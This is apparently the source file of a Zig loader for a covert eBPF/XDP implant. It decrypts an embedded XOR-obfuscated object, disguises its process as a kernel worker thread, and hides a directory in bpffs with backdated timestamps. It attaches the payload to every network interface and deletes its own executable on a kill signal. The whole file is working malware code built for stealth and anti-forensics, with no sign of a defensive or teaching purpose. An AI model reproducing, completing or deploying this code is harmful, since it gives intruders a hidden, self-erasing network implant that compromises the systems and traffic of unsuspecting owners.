const std = @import("std");
const sc = @import("syscalls.zig");

// Seed is injected by Makefile via sed
const SEED: u32 = 0x0;

export fn _start() noreturn {
    var b = @constCast(@embedFile("../target/ghost.o").*);
    
    // Updated XOR logic to match xor.zig
    var k = SEED;
    for (0..b.len) |i| {
        b[i] ^= @intCast(k & 0xFF);
        k = (k >> 8) | (k << 24);
        k = k +% 0x9E3779B9;
    }

    const m = parse(b);
    if (m.size == 0) sc.exit(1);

    _ = sc.prctl(15, @intFromPtr("[kworker/u2:1]"), 0, 0, 0);

    // Artifact backdating to Jan 1 2024
    _ = sc.mount("none", "/sys/fs/bpf", "bpf", 0, null);
    _ = sc.mkdir("/sys/fs/bpf/.srv", 0o700);
    const ts = [_]i64{ 1704067200, 0, 1704067200, 0 };
    _ = sc.utimensat(-100, "/sys/fs/bpf/.srv", &ts, 0);

    const fd = sc.bpf_syscall(5, &sc.bpf_attr_load{
        .prog_type = 6,
        .insn_cnt = @intCast(m.size / 8),
        .insns = @intFromPtr(b.ptr) + m.offset,
        .license = @intFromPtr("GPL"),
    }, 128);

    if (fd >= 0) {
        attach_all(@intCast(fd));
        
        // Self-Destruct Monitor: Checking m_kill (Map FD 2)
        var kill_flag: u32 = 0;
        while (kill_flag == 0) {
            _ = sc.bpf_syscall(1, &sc.bpf_attr_map_op{
                .map_fd = 2, 
                .key = @intFromPtr(&@as(u32, 0)),
                .value = @intFromPtr(&kill_flag),
            }, 32);
            sc.nanosleep(5);
        }
        _ = sc.unlink("/proc/self/exe");
        _ = sc.mount(null, "/sys/fs/bpf", null, 0x2, null); 
    }
    sc.exit(0);
}

fn attach_all(prog_fd: i32) void {
    var dir_fd = sc.open("/sys/class/net", 0);
    if (dir_fd < 0) return;
    var buf: [1024]u8 = undefined;
    const n = sc.getdents(dir_fd, &buf, 1024);
    sc.close(dir_fd);
    
    var pos: usize = 0;
    while (pos < n) {
        const entry = @as(*const sc.linux_dirent, @ptrFromInt(@intFromPtr(&buf) + pos));
        const name = std.mem.span(@as([*:0]const u8, @ptrCast(&entry.d_name)));
        if (!std.mem.eql(u8, name, ".") and !std.mem.eql(u8, name, "..") and !std.mem.eql(u8, name, "lo")) {
            const idx = get_idx(name);
            // Attempt Native XDP then Generic
            if (sc.bpf_syscall(14, &sc.bpf_attr_link{ .prog_fd = prog_fd, .target_ifindex = idx, .attach_type = 37, .flags = 2 }, 48) != 0) {
                _ = sc.bpf_syscall(14, &sc.bpf_attr_link{ .prog_fd = prog_fd, .target_ifindex = idx, .attach_type = 37, .flags = 0 }, 48);
            }
        }
        pos += entry.d_reclen;
    }
}

fn get_idx(name: []const u8) u32 {
    var path: [64]u8 = undefined;
    const p = std.fmt.bufPrintZ(&path, "/sys/class/net/{s}/ifindex", .{name}) catch return 0;
    const fd = sc.open(p, 0);
    if (fd < 0) return 0;
    var b_buf: [8]u8 = undefined;
    const n = sc.read(fd, &b_buf, 8);
    sc.close(fd);
    return std.fmt.parseInt(u32, std.mem.trim(u8, b_buf[0..n], "\n "), 10) catch 0;
}

fn parse(blob: []u8) struct { offset: u64, size: u64 } {
    const shoff = @as(*u64, @ptrFromInt(@intFromPtr(blob.ptr) + 40)).*;
    const shnum = @as(*u16, @ptrFromInt(@intFromPtr(blob.ptr) + 60)).*;
    const shentsize = @as(*u16, @ptrFromInt(@intFromPtr(blob.ptr) + 58)).*;
    for (0..shnum) |i| {
        const ptr = @intFromPtr(blob.ptr) + shoff + (i * shentsize);
        if (@as(*u32, @ptrFromInt(ptr + 4)).* == 1) {
            return .{ .offset = @as(*u64, @ptrFromInt(ptr + 24)).*, .size = @as(*u64, @ptrFromInt(ptr + 32)).* };
        }
    }
    return .{ .offset = 0, .size = 0 };
}
